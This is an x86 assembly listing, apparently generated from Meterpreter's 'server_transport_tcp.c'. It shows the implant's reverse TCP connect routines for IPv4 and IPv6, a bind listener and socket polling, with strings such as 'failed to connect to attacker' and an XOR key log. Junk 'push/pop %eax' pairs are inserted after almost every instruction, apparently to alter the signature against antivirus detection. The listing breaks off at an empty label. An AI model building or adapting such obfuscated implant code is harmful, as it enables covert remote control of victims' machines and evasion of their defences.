	.file	"server_transport_tcp.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$1072, %esp
push %eax
pop %eax
	movl	__imp__GetCurrentThreadId@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$LC0, 12(%esp)
push %eax
pop %eax
	movl	$1023, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___snprintf_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strlen
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	leal	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %ecx
push %eax
pop %eax
	movl	$1021, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$1024, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	leal	-1040(%ebp), %esi
push %eax
pop %eax
	movl	-12(%ebp), %ebx
push %eax
pop %eax
	addl	%esi, %ebx
push %eax
pop %eax
	movl	%ecx, 16(%esp)
push %eax
pop %eax
	movl	8(%ebp), %ecx
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%ebx, (%esp)
push %eax
pop %eax
	call	_vsnprintf_s
push %eax
pop %eax
	movl	$LC1, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__strcat_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__OutputDebugStringA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
	leal	-8(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC2:
	.ascii "[TCP RUN] Connection failed, sleeping for %u s\0"
	.text
	.def	_reverse_tcp_run;	.scl	3;	.type	32;	.endef
_reverse_tcp_run:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
L5:
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__connect@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$-1, -12(%ebp)
push %eax
pop %eax
	jne	L8
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC2, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_sleep
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	cmpl	%eax, 20(%ebp)
push %eax
pop %eax
	ja	L5
push %eax
pop %eax
	jmp	L4
push %eax
pop %eax
L8:
	nop
push %eax
pop %eax
L4:
	cmpl	$-1, -12(%ebp)
push %eax
pop %eax
	jne	L6
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__closesocket@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L6:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_reverse_tcp4;	.scl	3;	.type	32;	.endef
_reverse_tcp4:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	subl	$484, %esp
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movw	%ax, -444(%ebp)
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	$0, (%eax)
push %eax
pop %eax
	leal	-424(%ebp), %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	movl	$100, %ecx
push %eax
pop %eax
	movl	%edx, %edi
push %eax
pop %eax
	rep stosl
push %eax
pop %eax
	leal	-424(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$514, (%esp)
push %eax
pop %eax
	movl	__imp__WSAStartup@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L10
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L13
push %eax
pop %eax
L10:
	movl	$6, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	$2, (%esp)
push %eax
pop %eax
	movl	__imp__socket@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__gethostbyname@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__inet_ntoa@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	$0, -440(%ebp)
push %eax
pop %eax
	movl	$0, -436(%ebp)
push %eax
pop %eax
	movl	$0, -432(%ebp)
push %eax
pop %eax
	movl	$0, -428(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__inet_addr@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -436(%ebp)
push %eax
pop %eax
	movw	$2, -440(%ebp)
push %eax
pop %eax
	movzwl	-444(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__htons@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movw	%ax, -438(%ebp)
push %eax
pop %eax
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	leal	-440(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_reverse_tcp_run
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	cmpl	$0, -24(%ebp)
push %eax
pop %eax
	jne	L12
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
L12:
	movl	-24(%ebp), %eax
push %eax
pop %eax
L13:
	movl	-4(%ebp), %edi
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC3:
	.ascii "[STAGELESS IPV6] failed to connect to attacker\0"
	.align 4
LC4:
	.ascii "[STAGELESS IPV6] Socket successfully connected\0"
	.text
	.def	_reverse_tcp6;	.scl	3;	.type	32;	.endef
_reverse_tcp6:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	subl	$484, %esp
push %eax
pop %eax
	movl	28(%ebp), %eax
push %eax
pop %eax
	movl	$0, (%eax)
push %eax
pop %eax
	leal	-428(%ebp), %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	movl	$100, %ecx
push %eax
pop %eax
	movl	%edx, %edi
push %eax
pop %eax
	rep stosl
push %eax
pop %eax
	leal	-428(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$514, (%esp)
push %eax
pop %eax
	movl	__imp__WSAStartup@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L15
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L15:
	movl	$0, %ecx
push %eax
pop %eax
	movl	$32, %eax
push %eax
pop %eax
	andl	$-4, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L17:
	movl	%ecx, -460(%ebp,%eax)
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	cmpl	%edx, %eax
push %eax
pop %eax
	jb	L17
push %eax
pop %eax
	movl	$23, -456(%ebp)
push %eax
pop %eax
	movl	$1, -452(%ebp)
push %eax
pop %eax
	movl	$6, -448(%ebp)
push %eax
pop %eax
	leal	-464(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	leal	-460(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__getaddrinfo@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L19
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L19:
	movl	$6, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	$23, (%esp)
push %eax
pop %eax
	movl	__imp__socket@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	cmpl	$-1, -20(%ebp)
push %eax
pop %eax
	jne	L20
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L20:
	movl	$0, -12(%ebp)
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
L24:
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-464(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	jmp	L21
push %eax
pop %eax
L23:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 24(%eax)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__connect@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$-1, -12(%ebp)
push %eax
pop %eax
	je	L22
push %eax
pop %eax
	movl	$LC4, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	28(%ebp), %eax
push %eax
pop %eax
	movl	-20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	-464(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__freeaddrinfo@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L22:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
L21:
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L23
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC2, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_sleep
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	cmpl	%eax, 20(%ebp)
push %eax
pop %eax
	ja	L24
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__closesocket@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-464(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__freeaddrinfo@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
L25:
	movl	-4(%ebp), %edi
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_bind_tcp_run;	.scl	3;	.type	32;	.endef
_bind_tcp_run:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__bind@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L27
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L28
push %eax
pop %eax
L27:
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__listen@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L29
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L28
push %eax
pop %eax
L29:
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__accept@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$-1, -16(%ebp)
push %eax
pop %eax
	jne	L30
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L28
push %eax
pop %eax
L30:
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
L28:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__closesocket@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC5:
	.ascii "[BIND] Unable to create IPv6 socket\0"
	.align 4
LC6:
	.ascii "[BIND] Unable to remove IPV6_ONLY option\0"
LC7:
	.ascii "[BIND] Falling back to IPV4\0"
	.text
	.def	_bind_tcp;	.scl	3;	.type	32;	.endef
_bind_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	subl	$500, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movw	%ax, -460(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$0, (%eax)
push %eax
pop %eax
	leal	-420(%ebp), %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	movl	$100, %ecx
push %eax
pop %eax
	movl	%edx, %edi
push %eax
pop %eax
	rep stosl
push %eax
pop %eax
	leal	-420(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$514, (%esp)
push %eax
pop %eax
	movl	__imp__WSAStartup@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L33
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L33:
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$6, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	$23, (%esp)
push %eax
pop %eax
	movl	__imp__socket@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$-1, -16(%ebp)
push %eax
pop %eax
	jne	L35
push %eax
pop %eax
	movl	$LC5, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$1, -12(%ebp)
push %eax
pop %eax
	jmp	L36
push %eax
pop %eax
L35:
	movl	$0, -452(%ebp)
push %eax
pop %eax
	movl	$4, 16(%esp)
push %eax
pop %eax
	leal	-452(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	$27, 8(%esp)
push %eax
pop %eax
	movl	$41, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__setsockopt@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L36
push %eax
pop %eax
	movl	$LC6, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__closesocket@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	$1, -12(%ebp)
push %eax
pop %eax
L36:
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L38
push %eax
pop %eax
	movl	$LC7, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$6, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	$2, (%esp)
push %eax
pop %eax
	movl	__imp__socket@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
L38:
	movl	$0, %ecx
push %eax
pop %eax
	movl	$28, %eax
push %eax
pop %eax
	andl	$-4, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L39:
	movl	%ecx, -448(%ebp,%eax)
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	cmpl	%edx, %eax
push %eax
pop %eax
	jb	L39
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L41
push %eax
pop %eax
	leal	-448(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__htons@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%eax)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movw	$2, (%eax)
push %eax
pop %eax
	movzwl	-460(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__htons@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-20(%ebp), %edx
push %eax
pop %eax
	movw	%ax, 2(%edx)
push %eax
pop %eax
	jmp	L42
push %eax
pop %eax
L41:
	movl	_in6addr_any, %eax
push %eax
pop %eax
	movl	%eax, -440(%ebp)
push %eax
pop %eax
	movl	_in6addr_any+4, %eax
push %eax
pop %eax
	movl	%eax, -436(%ebp)
push %eax
pop %eax
	movl	_in6addr_any+8, %eax
push %eax
pop %eax
	movl	%eax, -432(%ebp)
push %eax
pop %eax
	movl	_in6addr_any+12, %eax
push %eax
pop %eax
	movl	%eax, -428(%ebp)
push %eax
pop %eax
	movw	$23, -448(%ebp)
push %eax
pop %eax
	movzwl	-460(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__htons@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movw	%ax, -446(%ebp)
push %eax
pop %eax
L42:
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L43
push %eax
pop %eax
	movl	$16, %edx
push %eax
pop %eax
	jmp	L44
push %eax
pop %eax
L43:
	movl	$28, %edx
push %eax
pop %eax
L44:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	leal	-448(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_bind_tcp_run
push %eax
pop %eax
L45:
	movl	-4(%ebp), %edi
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_server_socket_poll;	.scl	3;	.type	32;	.endef
_server_socket_poll:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$328, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_acquire
push %eax
pop %eax
	movl	$0, -288(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	jmp	L47
push %eax
pop %eax
L50:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	-284(%ebp,%eax,4), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, %edx
push %eax
pop %eax
	je	L53
push %eax
pop %eax
	addl	$1, -12(%ebp)
push %eax
pop %eax
L47:
	movl	-288(%ebp), %eax
push %eax
pop %eax
	cmpl	%eax, -12(%ebp)
push %eax
pop %eax
	jb	L50
push %eax
pop %eax
	jmp	L49
push %eax
pop %eax
L53:
	nop
push %eax
pop %eax
L49:
	movl	-288(%ebp), %eax
push %eax
pop %eax
	cmpl	%eax, -12(%ebp)
push %eax
pop %eax
	jne	L51
push %eax
pop %eax
	movl	-288(%ebp), %eax
push %eax
pop %eax
	cmpl	$63, %eax
push %eax
pop %eax
	ja	L51
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, -284(%ebp,%eax,4)
push %eax
pop %eax
	movl	-288(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movl	%eax, -288(%ebp)
push %eax
pop %eax
L51:
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	leal	1(%eax), %edx
push %eax
pop %eax
	leal	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	leal	-288(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	movl	__imp__select@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_release
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC8:
	.ascii "[TCP PACKET RECEIVE] reading in the header\0"
	.align 4
LC9:
	.ascii "[TCP] we didn't get enough header bytes\0"
	.align 4
LC10:
	.ascii "[TCP] the XOR key is: %02x%02x%02x%02x\0"
	.align 4
LC11:
